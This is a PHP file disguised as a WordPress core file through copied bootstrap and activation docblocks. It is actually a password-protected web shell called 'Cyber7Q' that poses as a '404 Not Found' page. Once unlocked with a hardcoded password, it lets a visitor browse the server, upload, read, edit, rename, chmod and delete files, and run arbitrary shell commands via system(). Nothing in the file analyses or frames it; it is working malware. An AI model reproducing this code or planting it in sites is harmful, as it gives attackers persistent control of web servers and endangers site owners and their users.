<?php 
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-config.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * wp-config.php file.
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */

/** Define ABSPATH as this file's directory */

/*
 * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
 * it's best to add a dummy function to the wp-config.php file, but as this call to the function
 * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
 */

/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */

define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

set_time_limit(0);
error_reporting(0);

$password = 'admin_gacor1';

session_start();
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }

    echo '<!DOCTYPE HTML>
    <HTML>
    <HEAD>
    </HEAD>
    <BODY>
	<center>
        <form method="POST">
            <label for="password">P</label>
            <input type="password" name="password" id="password" required>
            <input type="submit" value="L">
        </form>
	</center>
    </BODY>
    </HTML>';
    exit;
}

$style = base64_decode('
LyogR2VuZWwgYXlhcmxhciAqLwpib2R5IHsKICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsKICAgIG1hcmdpbjogMDsKICAgIHBhZGRpbmc6IDA7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjlmOWY5OwogICAgY29sb3I6ICMzMzM7Cn0KCi8qIFRhYmxveXUgc8SxxJ9kxLFybWEgKi8KdGFibGUgewogICAgd2lkdGg6IDEwMCU7CiAgICBtYXgtd2lkdGg6IDEyMDBweDsKICAgIG1hcmdpbjogMjBweCBhdXRvOwogICAgYm9yZGVyLWNvbGxhcHNlOiBjb2xsYXBzZTsKICAgIGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsIDAsIDAsIDAuMSk7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOwp9CgovKiBCYcWfbMSxayBzYXTEsXLEsW7EsSBkw7x6ZW5sZSAqLwp0YWJsZSB0aGVhZCB0aCB7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA3YWNjOwogICAgY29sb3I6ICNmZmY7CiAgICBmb250LXdlaWdodDogYm9sZDsKICAgIHRleHQtYWxpZ246IGxlZnQ7CiAgICBwYWRkaW5nOiAxMHB4Owp9CgovKiBUYWJsbyBow7xjcmVsZXJpbmkgZMO8emVubGUgKi8KdGFibGUgdGQsIHRhYmxlIHRoIHsKICAgIHBhZGRpbmc6IDhweCAxMnB4OwogICAgYm9yZGVyOiAxcHggc29saWQgI2RkZDsKICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7IC8qIE1ldG5pIHRhxZ/EsXJtYXogKi8KICAgIGZvbnQtc2l6ZTogMTRweDsKfQoKLyogQWx0ZXJuYXRpZiBzYXTEsXIgcmVua2xlcmkgKi8KdGFibGUgdGJvZHkgdHI6bnRoLWNoaWxkKG9kZCkgewogICAgYmFja2dyb3VuZC1jb2xvcjogI2YyZjJmMjsKfQoKdGFibGUgdGJvZHkgdHI6aG92ZXIgewogICAgYmFja2dyb3VuZC1jb2xvcjogI2U2ZjdmZjsKICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMC4zcyBlYXNlOwp9CgovKiBLw7zDp8O8ayBla3JhbmxhciBpw6dpbiB5YXRheSBrYXlkxLFybWEgKi8KLnRhYmxlLXdyYXBwZXIgewogICAgb3ZlcmZsb3cteDogYXV0bzsKfQoKLyogRGl6aW4gYmHEn2xhbnTEsWxhcsSxICovCmEgewogICAgY29sb3I6ICMwMDdhY2M7CiAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7Cn0KCmE6aG92ZXIgewogICAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7CiAgICBjb2xvcjogIzAwNWY5OTsKfQoKLyogQnV0b24gdmUgZ2lyacWfIGFsYW5sYXLEsW7EsSBkw7x6ZW5sZSAqLwppbnB1dCwgc2VsZWN0LCBidXR0b24gewogICAgcGFkZGluZzogNXB4OwogICAgZm9udC1zaXplOiAxNHB4OwogICAgYm9yZGVyOiAxcHggc29saWQgI2RkZDsKICAgIGJvcmRlci1yYWRpdXM6IDRweDsKfQoKaW5wdXQ6aG92ZXIsIHNlbGVjdDpob3ZlciwgYnV0dG9uOmhvdmVyIHsKICAgIGJvcmRlci1jb2xvcjogIzAwN2FjYzsKfQo=');

echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
    <title>' . htmlspecialchars('404 Not Found') . '</title>
    <style>' . $style . '</style>
</HEAD>
<BODY>
<H1><center>' . htmlspecialchars('Cyber7Q') . '</center></H1>';

if(isset($_GET['path'])){
    $path = realpath($_GET['path']);
}else{
    $path = realpath(getcwd());
}

echo '<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';

$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    $pat = htmlspecialchars($pat);
    if($pat == '' && $id == 0){
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo htmlspecialchars($paths[$i]);
        if($i != $id) echo "/";
    }
    echo '">' . $pat . '</a>/';
}

echo '</td></tr><tr><td>';

if(isset($_FILES['file'])){
    $upload_path = realpath($path) . '/' . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)){
        echo '<font color="green">' . htmlspecialchars('File Upload Success.') . '</font><br />';
    }else{
        echo '<font color="red">' . htmlspecialchars('File Upload Error.') . '</font><br />';
    }
}

echo '<form enctype="multipart/form-data" method="POST">
<input type="file" name="file" />
<input type="submit" value="' . htmlspecialchars('Upload') . '" />
</form>
</td></tr>';


if(isset($_GET['filesrc'])){
    $file = realpath($_GET['filesrc']);
    echo "<tr><td>Current File : " . htmlspecialchars($file);
    echo '</tr></td></table><br />';
    echo '<pre>' . htmlspecialchars(file_get_contents($file)) . '</pre>';
}

elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>' . htmlspecialchars($_POST['path']) . '<br /><br />';

    if($_POST['opt'] == 'chmod'){
        $file = realpath($_POST['path']);
        if(isset($_POST['perm'])){
            if(@chmod($file, octdec($_POST['perm']))){
                echo '<font color="green">' . htmlspecialchars('Change Permission Success.') . '</font><br />';
            }else{
                echo '<font color="red">' . htmlspecialchars('Change Permission Error.') . '</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="' . 
        substr(sprintf('%o', fileperms($file)), -4) . '" />
        <input type="hidden" name="path" value="' . htmlspecialchars($_POST['path']) . '">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }
    elseif($_POST['opt'] == 'rename'){
        $file = realpath($_POST['path']);
        $newname = htmlspecialchars($_POST['newname']);
        $newPath = $path . '/' . $newname;
        if(isset($_POST['newname'])){
            if(rename($file,$newPath)){
                echo '<font color="green">' . htmlspecialchars('Change Name Done.') . '</font><br />';
            }else{
                echo '<font color="red">' . htmlspecialchars('Change Name Error.') . '</font><br />';
            }
            $_POST['name'] = $newname;
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
        <input type="hidden" name="path" value="' . htmlspecialchars($_POST['path']) . '">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }
    elseif($_POST['opt'] == 'edit'){
        $file = realpath($_POST['path']);
        if(isset($_POST['src'])){
            $fp = fopen($file,'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">' . htmlspecialchars('Edit File Done.') . '</font><br />';
            }else{
                echo '<font color="red">' . htmlspecialchars('Edit File Error.') . '</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($file)) . '</textarea><br />
        <input type="hidden" name="path" value="' . htmlspecialchars($_POST['path']) . '">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Save" />
        </form>';
    }

    echo '</center>';
}

else{
    echo '</table><br /><center>';

    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        $file = realpath($_POST['path']);
        if($_POST['type'] == 'dir'){
            if(rmdir($file)){
                echo '<font color="green">' . htmlspecialchars('Delete Dir Done.') . '</font><br />';
            }else{
                echo '<font color="red">' . htmlspecialchars('Delete Dir Error.') . '</font><br />';
            }
        }
        elseif($_POST['type'] == 'file'){
            if(unlink($file)){
                echo '<font color="green">' . htmlspecialchars('Delete File Done.') . '</font><br />';
            }else{
                echo '<font color="red">' . htmlspecialchars('Delete File Error.') . '</font><br />';
            }
        }
    }

    echo '</center>';

    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>' . htmlspecialchars('Name') . '</center></td>
        <td><center>' . htmlspecialchars('Size') . '</center></td>
        <td><center>' . htmlspecialchars('Permissions') . '</center></td>
        <td><center>' . htmlspecialchars('Options') . '</center></td>
    </tr>';


    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=" . htmlspecialchars("$path/$dir") . "\">" . htmlspecialchars($dir) . "</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=" . htmlspecialchars($path) . "\">
        <select name=\"opt\">
            <option value=\"\"></option>
            <option value=\"delete\">Delete</option>
            <option value=\"chmod\">Chmod</option>
            <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"" . htmlspecialchars($dir) . "\">
        <input type=\"hidden\" name=\"path\" value=\"" . htmlspecialchars("$path/$dir") . "\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }

    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=" . htmlspecialchars("$path/$file") . "&path=" . htmlspecialchars($path) . "\">" . htmlspecialchars($file) . "</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=" . htmlspecialchars($path) . "\">
        <select name=\"opt\">
            <option value=\"\"></option>
            <option value=\"delete\">Delete</option>
            <option value=\"chmod\">Chmod</option>
            <option value=\"rename\">Rename</option>
            <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"" . htmlspecialchars($file) . "\">
        <input type=\"hidden\" name=\"path\" value=\"" . htmlspecialchars("$path/$file") . "\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }

    echo '</table></div>';
}

echo '<div style="margin-top: 20px; text-align: center;">
<h3>' . htmlspecialchars('CMD') . '</h3>
<form method="GET">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80" placeholder="Enter C...">
    <input type="submit" value="' . htmlspecialchars('Exec') . '">
</form>
<div class="pre-output">';

if(isset($_GET['cmd'])) {
    $cmd = escapeshellcmd($_GET['cmd']);
    ob_start();
    system($cmd . ' 2>&1');
    $output = ob_get_clean();
    echo htmlspecialchars($output);
}

echo '</div></div>';

function perms($file){
    $perms = fileperms($file);

    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } 
    elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } 
    elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } 
    elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } 
    elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } 
    elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } 
    elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } 
    else {
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}


echo '</BODY></HTML>';
?>
